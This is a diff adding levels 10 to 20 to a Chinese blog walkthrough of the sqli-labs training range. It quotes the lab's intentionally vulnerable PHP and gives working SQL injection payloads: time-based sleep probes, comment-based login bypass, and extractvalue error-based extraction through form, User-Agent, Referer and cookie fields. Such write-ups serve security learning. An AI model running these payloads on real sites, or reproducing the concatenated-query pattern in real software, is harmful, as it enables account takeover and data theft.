@@ -461,6 +461,351 @@ payload：?id=<span class="number">1</span>%<span class="number">27</span>) <spa
 <pre><code class="highlight mysql">?id=1%27 and if(substr(database(),1,1)=&#x27;s&#x27;,sleep(5),1) -- - #如果数据库第一个字符为s就延时5秒，后续结果和前面的盲注是一致的</code></pre>
 <p>总的来说，盲注的话基本都是需要单个单个的猜解，所以时间盲注和布尔盲注原理都是一样的，后面表名字段名就不累述了，基本都是一样的</p>
 <p>只要是盲注都可以使用DNSlog来解决，但是不能在Linux服务器上使用这个，同时还需要load_file()不被禁止，如果load_file()被 禁止就只能使用基本的方法来解决了，只要掌握了原理，也可以自己写脚本是一样的，但是有sqlmap就省去了很多的麻烦</p>
+<h3 id="Get-Bind-Time-based-double-quotes-Less-10">Get - Bind - Time based - double quotes  Less-10</h3>
+<p>这个注入其实也是时间注入，但是需要使用<code>&quot;</code>闭合，和less-9只是将<code>'</code>更改为<code>&quot;</code>就可以了，剩下的就千篇一律了，就不做更多的赘述了，还是看一下php源码吧，如下：</p>
+<pre><code class="highlight php"><span class="variable">$id</span> = <span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&quot;&#x27;</span>; <span class="comment">#在这个位置对id的值进行添加双引号操作</span>
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+
+	<span class="keyword">if</span>(<span class="variable">$row</span>)
+	&#123;
+  	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;	
+  	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;
+  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+  	&#125;
+	<span class="keyword">else</span> 
+	&#123;
+	
+	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;
+	<span class="keyword">echo</span> <span class="string">&#x27;You are in...........&#x27;</span>;
+	<span class="comment">//print_r(mysql_error());</span>
+	<span class="comment">//echo &quot;You have an error in your SQL syntax&quot;;</span>
+	<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/font&gt;&quot;</span>;	
+	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size= 3&gt;&#x27;</span>;	
+	
+	&#125;
+&#125;</code></pre>
+<p><font color='red'>以下部分就是属于post请求的sql注入了-v-</font></p>
+<h3 id="POST-Error-based-Single-quotes-String-Less-11">POST - Error based - Single quotes - String Less-11</h3>
+<p>这个在原理上基本和前面GET方法的是没有区别的，只是需要在表单中构造payload，如下图Less-11-1</p>
+<p><img src="https://s1.imagehub.cc/images/2021/10/03/imageb09cf5d5d778391b.png" alt="imageb09cf5d5d778391b.png"></p>
+<center>【Less-11-1】</center>
+<p>至于后面的操作基本一致，就不再赘述了，前面的已经说的够多了</p>
+<blockquote>
+<p>注意事项：</p>
+<ul>
+<li>在这个靶场中的这关，我们需要知道username，使得我们能够正常查询，这种情况可以在用户登录框处且知道正确的用户名来进行注入，密码啥的不知道无所谓，因为我们将后面的password注释掉了</li>
+<li>不要在第二个位置构造payload，因为基本不可能成功，至于为什么看源码</li>
+</ul>
+</blockquote>
+<p>相对应的源码如下：</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>; <span class="comment">#在这可以看出他是将用户名密码带进去一起匹配的，同时成立才会返回成功，但如果我们像下面这样构造</span>
+
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and 1=1 # and password=&#x27;<span class="subst">$passwd</span>&#x27; LIMIT 0,1&quot;</span>; <span class="comment">#这样的话只需要$uname的值存在即可，因为我们使用`#`注释掉了后面password=&#x27;$passwd&#x27;...等，实际执行的语句就成了下面这样的</span>
+
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=&#x27;<span class="subst">$uname</span>&#x27; and 1=1&quot;</span> <span class="comment">#这就是为什么要username一定存在的道理了，也就是为什么要构造username这个值而非password这个值了</span>
+    
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+</code></pre>
+<p>看了源码也就知道原理了，是不是和前面的一样嘛，就不多说了</p>
+<blockquote>
+<p>解释以下为什么用<code>#</code>，因为在前面的sql注入只是那里提过，<code>#</code>在mysql中是注释的意思，<code>--</code>也是注释的意思，为什么不用<code>--</code>因为太多了麻烦</p>
+</blockquote>
+<h3 id="POST-Error-based-Double-quotes-String-with-twist-Less-12">POST - Error based - Double quotes - String - with twist  Less-12</h3>
+<p>其实这一个和Less-3是一样的，双引号加<code>)</code>构造，我们看下原理构造的payload就好了，至于后面的详细操作没啥说的，和前面一致</p>
+<pre><code class="highlight php"><span class="comment">// connectivity</span>
+<span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;<span class="comment">#这就是给值加双引号</span>
+<span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; 
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=(<span class="subst">$uname</span>) and password=(<span class="subst">$passwd</span>) LIMIT 0,1&quot;</span>;<span class="comment">#又因为这里存在括号，所以构造时需要括号加双引号</span>
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+</code></pre>
+<p>源码很简单，没啥可说的，接下来就是payload，还是构造username这个的payload，为什么？自己领悟</p>
+<pre><code class="highlight mysql">admin&quot;) and 1=1 # #返回成功</code></pre>
+<p><img src="https://s1.imagehub.cc/images/2021/10/03/imageddc47be0f9fdcb6b.png" alt="imageddc47be0f9fdcb6b.png"></p>
+<center>【Less-12-1】</center>
+<h3 id="POST-Double-Injection-Single-quotes-String-with-twist-Less-13">POST -Double Injection - Single quotes - String - with twist  Less-13</h3>
+<p>这个其实就是一个单引号加括号的一个双注入，这个和前面的，这个需要提一点的是这个无法使用联合查询，需要用到报错注入最方便快捷</p>
+<blockquote>
+<p>联合注入需要显位存在，所以在不存在显位的情况下我们就可以考虑盲注，报错注入</p>
+</blockquote>
+<p>payload如下：</p>
+<pre><code class="highlight mysql">admin`&#x27;`) and (select extractvalue(1,concat(0x7e,(select database())))) # 
+ #需要注释后面的语句，同前面一样需要在username处构造，为了观赏性 &#x27; 使用 `&#x27;` 括起来，自己用的时候去掉``即可</code></pre>
+<p>在测试的时候发现盲注也是存在的，但是就盲注而言，报错注入最快，如果关闭了错误打印的话，就只能使用盲注了，但是盲注的话还可以使用dnslog加速注入的嘛。只要路子宽，sql注入打的欢</p>
+<p>至于后面的表名字段名啥的，替换<code>select database()</code>就可以了，就不多说了</p>
+<h3 id="POST-Double-Injection-Single-quotes-String-with-twist-Less-14">POST - Double Injection - Single quotes - String - with twist   Less-14</h3>
+<p>这个注入的话其实也就是双引号注入，标题写错了罢了，源码上显示的是双引号的，至于后面的操作，因为关闭了报错和是否正确显示，那么最好的解决方法就是使用时间盲注，经过测试是允许使用时间盲注的，源码如下：</p>
+<pre><code class="highlight php"><span class="comment">// connectivity</span>
+<span class="variable">$uname</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;&quot;&#x27;</span>;
+<span class="variable">$passwd</span>=<span class="string">&#x27;&quot;&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&#x27;&quot;&#x27;</span>; 
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username=<span class="subst">$uname</span> and password=<span class="subst">$passwd</span> LIMIT 0,1&quot;</span>;
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+
+<span class="keyword">if</span>(<span class="variable">$row</span>)
+&#123;
+    <span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span>
+
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&#x27;</span>;
+    <span class="comment">//echo &quot; You Have successfully logged in &quot; ;</span>
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&#x27;</span>;	
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    <span class="comment">//echo &#x27;Your Login name:&#x27;. $row[&#x27;username&#x27;];</span>
+    <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span>
+    <span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span>
+    <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span>
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;	
+
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+&#125;
+<span class="keyword">else</span>  
+&#123;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;
+    <span class="comment">//echo &quot;Try again looser&quot;;</span>
+    print_r(mysql_error());
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;	
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  
+&#125;</code></pre>
+<p>从源码可以看出其实还是有改变的，但是因为不知道那个图片是正常的（如果不看源码的情况下），所以采用时间注入</p>
+<p>构造的payload如下：</p>
+<pre><code class="highlight mysql">admin`&quot;` and sleep(5) -- - #这里需要使用--注释才可以，发现确实延时5秒，所以存在时间盲注</code></pre>
+<p>知道存在时间盲注的情况下，可以采用dnslog来获取值，也可以使用常规战术，这个需要看自己吧。后面的操作就不讲了，前面都讲过。本人不喜欢炒剩饭</p>
+<h3 id="POST-Bind-Boolean-time-based-Single-quotes-Less-15">POST - Bind - Boolean/time based - Single quotes   Less-15</h3>
+<p>这个是一个布尔盲注和时间盲注同时存在的，操作和前面盲注的操作一样就不讲了，也没有啥特别的，对了是单引号闭合</p>
+<h3 id="POST-Bind-Boolean-time-based-Double-quotes-Less-16">POST - Bind - Boolean/time based - Double quotes   Less-16</h3>
+<p>这是一个双引号加括号闭合的时间/布尔型盲注，前面也讲过，如果前面的认真刷过，这个可以快速过</p>
+<h3 id="POST-Update-query-Error-Based-String-Less-17">POST -Update query - Error Based - String   Less-17</h3>
+<p>当我们测试账号进行注入时，发现怎么都不成功，因为需要更新密码，有可能会在账号那个位置进行gpc处理，但是密码一般不会，因为密码有的是允许有引号啥的，所以我们可以测试下更新密码</p>
+<p><img src="https://s1.imagehub.cc/images/2021/10/04/image9c96b6fee85447a7.png" alt="image9c96b6fee85447a7.png"></p>
+<center>【Less-17-1】</center>
+<p>不好意思成功了，我们看看是怎么执行的，看源码：</p>
+<pre><code class="highlight php"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))
+
+&#123;
+<span class="comment">//making sure uname is not injectable</span>
+<span class="variable">$uname</span>=check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);  <span class="comment">#这里对uname进行了处理，使得`&#x27;`无法使用</span>
+
+<span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]; <span class="comment">#但是密码没有啊，而且从下面可以看出密码是与数据库进行交互了</span>
+
+
+<span class="comment">//logging the connection parameters to a file for analysis.</span>
+<span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);
+fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;User Name:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);
+fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;New Password:&#x27;</span>.<span class="variable">$passwd</span>.<span class="string">&quot;\n&quot;</span>);
+fclose(<span class="variable">$fp</span>);
+
+
+<span class="comment">// connectivity </span>
+@<span class="variable">$sql</span>=<span class="string">&quot;SELECT username, password FROM users WHERE username= <span class="subst">$uname</span> LIMIT 0,1&quot;</span>;
+
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+<span class="comment">//echo $row;</span>
+	<span class="keyword">if</span>(<span class="variable">$row</span>)
+	&#123;
+  		<span class="comment">//echo &#x27;&lt;font color= &quot;#0000ff&quot;&gt;&#x27;;	</span>
+		<span class="variable">$row1</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  	
+		<span class="comment">//echo &#x27;Your Login name:&#x27;. $row1;</span>
+		<span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;<span class="subst">$passwd</span>&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;
+        <span class="comment">#更新密码</span>
+        <span class="comment">#构造后的$update</span>
+        <span class="variable">$update</span>=<span class="string">&quot;UPDATE users SET password = &#x27;admin&#x27; and extractvalue(1,concat(0x7e,(select database()))) and &#x27;1&#x27;=&#x27;1&#x27; WHERE username=&#x27;<span class="subst">$row1</span>&#x27;&quot;</span>;
+		mysql_query(<span class="variable">$update</span>);
+  		<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+	
+	
+	
+		<span class="keyword">if</span> (mysql_error())
+		&#123;
+			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;
+			print_r(mysql_error());
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&lt;/br&gt;&quot;</span>;
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+		&#125;
+		<span class="keyword">else</span>
+		&#123;
+			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;
+			<span class="comment">//echo &quot; You password has been successfully updated &quot; ;		</span>
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+		&#125;
+	
+		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag1.jpg&quot;   /&gt;&#x27;</span>;	
+		<span class="comment">//echo &#x27;Your Password:&#x27; .$row[&#x27;password&#x27;];</span>
+  		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+	
+
+
+  	&#125;
+	<span class="keyword">else</span>  
+	&#123;
+		<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;4.5&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;
+		<span class="comment">//echo &quot;Bug off you Silly Dumb hacker&quot;;</span>
+		<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;
+		<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot;   /&gt;&#x27;</span>;
+	
+		<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  
+	&#125;
+&#125;</code></pre>
+<p>payload为：</p>
+<pre><code class="highlight mysql">admin&#x27; and extractvalue(1,concat(0x7e,(select database()))) and &#x27;1&#x27;=&#x27;1</code></pre>
+<p>剩下的基操没啥说的</p>
+<h3 id="POST-Header-Injection-Uagent-field-Error-based-Less-18">POST - Header Injection - Uagent field - Error based   Less-18</h3>
+<p>这是一个请求头注入，且注入点在user-agent上面，首先查看源码，如下：</p>
+<pre><code class="highlight php"><span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;
+<span class="variable">$result1</span> = mysql_query(<span class="variable">$sql</span>);
+<span class="variable">$row1</span> = mysql_fetch_array(<span class="variable">$result1</span>);
+<span class="keyword">if</span>(<span class="variable">$row1</span>)
+&#123;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;
+    <span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;<span class="comment">#插入语句，可以对其进行构造</span>
+    mysql_query(<span class="variable">$insert</span>);
+    <span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span>
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+    <span class="comment">//echo &quot;&lt;br&gt;&quot;;</span>
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;			
+    <span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .<span class="variable">$uagent</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    print_r(mysql_error());			
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+
+&#125;
+<span class="keyword">else</span>
+&#123;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;
+    <span class="comment">//echo &quot;Try again looser&quot;;</span>
+    print_r(mysql_error());
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;			
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;	
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  
+&#125;
+</code></pre>
+<p>由源码可得，用户名是经过gpc的，也就是魔术引号，所以在用户名处构造payload就不现实了，但是下面出现了一个insert语句，为什么使用user-agent，因为他没有进行gpc转义，使用burp抓包结果如下图Less-18-1</p>
+<p><img src="https://s1.imagehub.cc/images/2021/10/04/image.png" alt="image.png"></p>
+<center>【Less-18-1】</center>
+<p>这时我们就可以在user-agent后面进行构造了，payload如下：</p>
+<pre><code class="highlight mysql">%27 and extractvalue(1,concat(0x7e,(select database()),0x7e)) and &#x27;1&#x27;=&#x27;1</code></pre>
+<p>最终数据库通过报错注入查询出来了，如下图Less-18-2</p>
+<p><img src="https://s1.imagehub.cc/images/2021/10/04/image7deb95ab5929eeb7.png" alt="image7deb95ab5929eeb7.png"></p>
+<center>【Less-18-2】</center>
+<p>这一个测试比较有意思的是需要用户名和密码必须正确，否则就无法进行，其实也挺不错的。</p>
+<p>如果我自己注册一个账号，我是不是可以通过登录点提供的注入得到其他用户的密码呢，再一个，很多网站用的并不是第三方安防软件，而是自己写的判断，同时还把信息录入了数据库，再给你提示个请不要非法入侵，你的IP已被记录，这不是自己给自己找洞嘛？</p>
+<p>至于接下来的操作就不多说了，还不会自己看前面的教程</p>
+<h3 id="POST-Header-Injection-Referer-field-Error-based-Less-19">POST - Header Injection -Referer field - Error based   Less-19</h3>
+<p>这个给你们看两张图你们应该就能懂起了，多的我也就懒得说了，有图有真相</p>
+<p><img src="https://s1.imagehub.cc/images/2021/10/04/imagebd9aa81c491b096e.png" alt="imagebd9aa81c491b096e.png"><img src="https://s1.imagehub.cc/images/2021/10/04/imaged6f852ee1e1f447b.png" alt="imaged6f852ee1e1f447b.png"></p>
+<p>顺便再给你们看哈源码，其实看到这里就已经可以判断应该存在注入了，然后自己再测试一下再所有的header字段后面加相应的测试payload，源码如下：</p>
+<pre><code class="highlight php"><span class="variable">$uagent</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];<span class="comment">#获取的是referer，这下懂了吧</span>
+	<span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];
+	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+	<span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .<span class="variable">$IP</span>;
+	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+	<span class="comment">//echo &#x27;Your User Agent is: &#x27; .$uagent;</span>
+<span class="comment">// take the variables</span>
+<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]))
+
+	&#123;
+	<span class="variable">$uname</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;uname&#x27;</span>]);
+	<span class="variable">$passwd</span> = check_input(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>]);
+	
+	<span class="comment">/*</span>
+<span class="comment">	echo &#x27;Your Your User name:&#x27;. $uname;</span>
+<span class="comment">	echo &quot;&lt;br&gt;&quot;;</span>
+<span class="comment">	echo &#x27;Your Password:&#x27;. $passwd;</span>
+<span class="comment">	echo &quot;&lt;br&gt;&quot;;</span>
+<span class="comment">	echo &#x27;Your User Agent String:&#x27;. $uagent;</span>
+<span class="comment">	echo &quot;&lt;br&gt;&quot;;</span>
+<span class="comment">	echo &#x27;Your User Agent String:&#x27;. $IP;</span>
+<span class="comment">	*/</span>
+
+	<span class="comment">//logging the connection parameters to a file for analysis.	</span>
+	<span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);
+	fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;Referer:&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&quot;\n&quot;</span>);
+	
+	fclose(<span class="variable">$fp</span>);
+	
+	
+	
+	<span class="variable">$sql</span>=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;
+	<span class="variable">$result1</span> = mysql_query(<span class="variable">$sql</span>);
+	<span class="variable">$row1</span> = mysql_fetch_array(<span class="variable">$result1</span>);
+		<span class="keyword">if</span>(<span class="variable">$row1</span>)
+			&#123;
+			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;
+			<span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>; <span class="comment">#还是那个熟悉的insert语句</span>
+			mysql_query(<span class="variable">$insert</span>);
+			<span class="comment">//echo &#x27;Your IP ADDRESS is: &#x27; .$IP;</span>
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+			<span class="comment">//echo &quot;&lt;br&gt;&quot;;</span>
+			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;			
+			<span class="keyword">echo</span> <span class="string">&#x27;Your Referer is: &#x27;</span> .<span class="variable">$uagent</span>;
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+			print_r(mysql_error());			
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;
+			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+			
+			&#125;
+		<span class="keyword">else</span>
+			&#123;
+			<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;
+			<span class="comment">//echo &quot;Try again looser&quot;;</span>
+			print_r(mysql_error());
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;			
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;
+			<span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;	
+			<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  
+			&#125;
+
+	&#125;</code></pre>
+<h3 id="POST-Cookie-Injection-Uagent-field-Error-based-Less-20">POST - Cookie Injection - Uagent field - Error based   Less-20</h3>
+<p>这是一个cookie注入，在登录成功后，一般后端会返回一个cookie给前端，以后页面刷新或者其他操作只需要查询cookie中特殊的值，就可以得到结果，这也就给注入创造了机会，而且这个还不会受gpc影响，重要源码如下：</p>
+<pre><code class="highlight php"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>]; <span class="comment">#具体的值看下图Less-20-1</span>
+<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;
+<span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);
+<span class="keyword">if</span> (!<span class="variable">$result</span>)
+&#123;
+    <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());
+&#125;
+<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);
+<span class="keyword">if</span>(<span class="variable">$row</span>)
+&#123;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;	
+    <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;  	
+    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];
+&#125;
+<span class="keyword">else</span>	
+&#123;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;
+    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;
+    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;
+    <span class="comment">//echo &#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;;</span>
+&#125;</code></pre>
+<p><img src="https://s1.imagehub.cc/images/2021/10/04/imageca23bdb3b32f5d81.png" alt="imageca23bdb3b32f5d81.png"></p>
+<center>【Less-20-1】</center>
+<p>构造payload就不说了，和less-19一致，至于后面的操作就没啥用了，一般cookie比user-agent用的多以点，至于会出现在哪种情况，前面已经说的很明白了，就不需要再说了</p>
 
 </div>
 
